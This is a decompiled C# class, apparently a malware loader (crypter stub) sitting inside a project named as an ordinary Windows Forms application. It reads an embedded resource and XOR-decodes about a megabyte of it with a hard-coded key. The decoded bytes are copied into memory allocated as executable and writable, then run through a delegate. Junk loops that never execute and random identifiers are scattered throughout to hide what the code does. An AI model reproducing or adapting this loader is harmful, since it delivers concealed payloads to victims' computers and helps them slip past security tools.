using System;
using System.Runtime.InteropServices;
using WindowsFormsApplication.Properties;

namespace WindowsFormsApplication;

internal class Class1
{
	[Flags]
	public enum AllocationType : uint
	{
		COMMIT = 0x1000u,
		RESERVE = 0x2000u,
		RESET = 0x80000u,
		LARGE_PAGES = 0x20000000u,
		PHYSICAL = 0x400000u,
		TOP_DOWN = 0x100000u,
		WRITE_WATCH = 0x200000u
	}

	[Flags]
	public enum MemoryProtection : uint
	{
		EXECUTE = 0x10u,
		EXECUTE_READ = 0x20u,
		EXECUTE_READWRITE = 0x40u,
		EXECUTE_WRITECOPY = 0x80u,
		NOACCESS = 1u,
		READONLY = 2u,
		READWRITE = 4u,
		WRITECOPY = 8u,
		GUARD_Modifierflag = 0x100u,
		NOCACHE_Modifierflag = 0x200u,
		WRITECOMBINE_Modifierflag = 0x400u
	}

	private delegate int qmqqpgmlucy();

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr VirtualAlloc(IntPtr lpAddress, IntPtr dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

	public static int urnosiq(int tvskp, int upygrb, int znica, int jkhidhvxno)
	{
		byte[] array = new byte[1235273];
		byte b = 242;
		byte b2 = 165;
		byte b3 = 92;
		byte b4 = 3;
		byte b5 = 164;
		while (b <= 121 && b2 != 113 && b3 > 189 && b4 != 13 && b5 >= 235)
		{
			b = (byte)(b + 1);
			b2 = (byte)(b2 + 1);
			b3 = (byte)(b3 + 1);
			b4 = (byte)(b4 + 1);
			b5 = (byte)(b5 + 1);
		}
		byte[] array2 = new byte[166]
		{
			95, 85, 85, 85, 85, 85, 85, 85, 85, 85,
			85, 85, 85, 85, 85, 85, 85, 85, 85, 85,
			85, 85, 85, 85, 85, 85, 85, 85, 85, 85,
			85, 85, 85, 85, 85, 85, 85, 85, 85, 85,
			85, 85, 85, 186, 178, 108, 53, 53, 53, 53,
			53, 53, 53, 53, 53, 53, 53, 53, 53, 53,
			53, 53, 53, 53, 53, 53, 53, 53, 53, 53,
			53, 53, 53, 53, 53, 53, 53, 53, 53, 53,
			53, 53, 53, 53, 53, 53, 53, 53, 53, 53,
			53, 53, 13, 233, 233, 233, 233, 233, 233, 233,
			233, 233, 233, 233, 233, 240, 114, 69, 196, 30,
			30, 133, 133, 240, 123, 192, 98, 211, 211, 211,
			211, 211, 211, 211, 211, 211, 211, 211, 211, 211,
			211, 211, 211, 211, 211, 211, 211, 211, 211, 211,
			211, 211, 211, 211, 211, 211, 211, 186, 101, 66,
			66, 66, 66, 66, 66, 66, 66, 66, 66, 186,
			218, 218, 218, 218, 218, 218
		};
		byte b6 = 9;
		byte b7 = 119;
		while (b6 >= 79 && b7 < 209)
		{
			b6 = (byte)(b6 - 1);
			b7 = (byte)(b7 - 1);
		}
		int num = 0;
		byte b8 = 75;
		byte b9 = 144;
		while (b8 > 169 && b9 < 5)
		{
			b8 = (byte)(b8 + 1);
			b9 = (byte)(b9 - 1);
		}
		Resources.ocjas.Read(array, 0, 1235273);
		byte b10 = 177;
		byte b11 = 51;
		byte b12 = 185;
		while (b10 != 252 && b11 > 8 && b12 == 235)
		{
			b10 = (byte)(b10 + 1);
			b11 = (byte)(b11 + 1);
			b12 = (byte)(b12 - 1);
		}
		IntPtr intPtr = VirtualAlloc(IntPtr.Zero, (IntPtr)1030960, AllocationType.COMMIT | AllocationType.RESERVE, MemoryProtection.EXECUTE_READWRITE);
		while (true)
		{
			byte b13 = 161;
			byte b14 = 47;
			byte b15 = 238;
			byte b16 = 125;
			byte b17 = 210;
			byte b18 = 157;
			byte b19 = 108;
			byte b20 = 125;
			byte b21 = 18;
			byte b22 = 208;
			byte b23 = 191;
			byte b24 = 231;
			while (b13 <= 214 && b14 >= 61 && b15 == 186 && b16 <= 181 && b17 > 26 && b18 != 119 && b19 <= 242 && b20 <= 153 && b21 < 8 && b22 == 165 && b23 <= 56 && b24 > 177)
			{
				b13 = (byte)(b13 - 1);
				b14 = (byte)(b14 - 1);
				b15 = (byte)(b15 - 1);
				b16 = (byte)(b16 - 1);
				b17 = (byte)(b17 + 1);
				b18 = (byte)(b18 - 1);
				b19 = (byte)(b19 - 1);
				b20 = (byte)(b20 + 1);
				b21 = (byte)(b21 + 1);
				b22 = (byte)(b22 - 1);
				b23 = (byte)(b23 + 1);
				b24 = (byte)(b24 + 1);
			}
			if (num == 1030960)
			{
				break;
			}
			byte b25 = 82;
			byte b26 = 110;
			byte b27 = 60;
			byte b28 = 33;
			byte b29 = 89;
			byte b30 = 74;
			byte b31 = 109;
			byte b32 = 7;
			byte b33 = 98;
			byte b34 = 116;
			byte b35 = 193;
			byte b36 = 111;
			byte b37 = 70;
			byte b38 = 152;
			while (b25 > 106 && b26 != 102 && b27 == 48 && b28 == 28 && b29 > 253 && b30 <= 98 && b31 >= 232 && b32 != 121 && b33 >= 77 && b34 == 194 && b35 < 8 && b36 < 152 && b37 < 26 && b38 <= 170)
			{
				b25 = (byte)(b25 + 1);
				b26 = (byte)(b26 + 1);
				b27 = (byte)(b27 - 1);
				b28 = (byte)(b28 + 1);
				b29 = (byte)(b29 + 1);
				b30 = (byte)(b30 + 1);
				b31 = (byte)(b31 + 1);
				b32 = (byte)(b32 + 1);
				b33 = (byte)(b33 + 1);
				b34 = (byte)(b34 - 1);
				b35 = (byte)(b35 + 1);
				b36 = (byte)(b36 - 1);
				b37 = (byte)(b37 - 1);
				b38 = (byte)(b38 - 1);
			}
			int num2 = num % 166;
			array[num + 204313] ^= array2[num2];
			byte b39 = 191;
			byte b40 = 35;
			byte b41 = 188;
			byte b42 = 20;
			byte b43 = 118;
			byte b44 = 90;
			byte b45 = 35;
			byte b46 = 212;
			byte b47 = 45;
			byte b48 = 19;
			byte b49 = 154;
			byte b50 = 45;
			byte b51 = 142;
			byte b52 = 0;
			byte b53 = 164;
			byte b54 = 30;
			byte b55 = 200;
			byte b56 = 156;
			while (b39 == 20 && b40 != 93 && b41 <= 214 && b42 < 5 && b43 <= 38 && b44 >= 73 && b45 == 64 && b46 <= 96 && b47 >= 212 && b48 == 16 && b49 <= 75 && b50 == 28 && b51 <= 213 && b52 >= 192 && b53 <= 35 && b54 > 101 && b55 == 74 && b56 == 228)
			{
				b39 = (byte)(b39 - 1);
				b40 = (byte)(b40 - 1);
				b41 = (byte)(b41 - 1);
				b42 = (byte)(b42 + 1);
				b43 = (byte)(b43 - 1);
				b44 = (byte)(b44 + 1);
				b45 = (byte)(b45 + 1);
				b46 = (byte)(b46 + 1);
				b47 = (byte)(b47 - 1);
				b48 = (byte)(b48 + 1);
				b49 = (byte)(b49 - 1);
				b50 = (byte)(b50 - 1);
				b51 = (byte)(b51 + 1);
				b52 = (byte)(b52 - 1);
				b53 = (byte)(b53 - 1);
				b54 = (byte)(b54 + 1);
				b55 = (byte)(b55 + 1);
				b56 = (byte)(b56 - 1);
			}
			num++;
			byte b57 = 120;
			byte b58 = 128;
			byte b59 = 90;
			byte b60 = 59;
			byte b61 = 171;
			byte b62 = 206;
			byte b63 = 70;
			byte b64 = 218;
			while (b57 != 53 && b58 <= 251 && b59 < 94 && b60 >= 105 && b61 <= 115 && b62 >= 73 && b63 <= 105 && b64 != 139)
			{
				b57 = (byte)(b57 - 1);
				b58 = (byte)(b58 - 1);
				b59 = (byte)(b59 - 1);
				b60 = (byte)(b60 - 1);
				b61 = (byte)(b61 + 1);
				b62 = (byte)(b62 - 1);
				b63 = (byte)(b63 - 1);
				b64 = (byte)(b64 + 1);
			}
		}
		qmqqpgmlucy qmqqpgmlucy = (qmqqpgmlucy)Marshal.GetDelegateForFunctionPointer(intPtr, typeof(qmqqpgmlucy));
		Marshal.Copy(array, 204313, intPtr, 1030960);
		byte b65 = 210;
		byte b66 = 102;
		byte b67 = 64;
		byte b68 = 132;
		byte b69 = 131;
		byte b70 = 40;
		byte b71 = 142;
		byte b72 = 183;
		byte b73 = 67;
		byte b74 = 17;
		byte b75 = 178;
		byte b76 = 151;
		byte b77 = 21;
		byte b78 = 144;
		byte b79 = 115;
		byte b80 = 54;
		byte b81 = 141;
		while (b65 > 129 && b66 > 121 && b67 != 99 && b68 <= 201 && b69 == 88 && b70 <= 8 && b71 < 119 && b72 == 202 && b73 < 232 && b74 < 32 && b75 >= 171 && b76 < 72 && b77 == 102 && b78 >= 19 && b79 != 163 && b80 == 99 && b81 >= 254)
		{
			b65 = (byte)(b65 + 1);
			b66 = (byte)(b66 + 1);
			b67 = (byte)(b67 + 1);
			b68 = (byte)(b68 + 1);
			b69 = (byte)(b69 + 1);
			b70 = (byte)(b70 + 1);
			b71 = (byte)(b71 + 1);
			b72 = (byte)(b72 - 1);
			b73 = (byte)(b73 - 1);
			b74 = (byte)(b74 - 1);
			b75 = (byte)(b75 + 1);
			b76 = (byte)(b76 + 1);
			b77 = (byte)(b77 + 1);
			b78 = (byte)(b78 + 1);
			b79 = (byte)(b79 + 1);
			b80 = (byte)(b80 + 1);
			b81 = (byte)(b81 - 1);
		}
		return qmqqpgmlucy();
	}
}
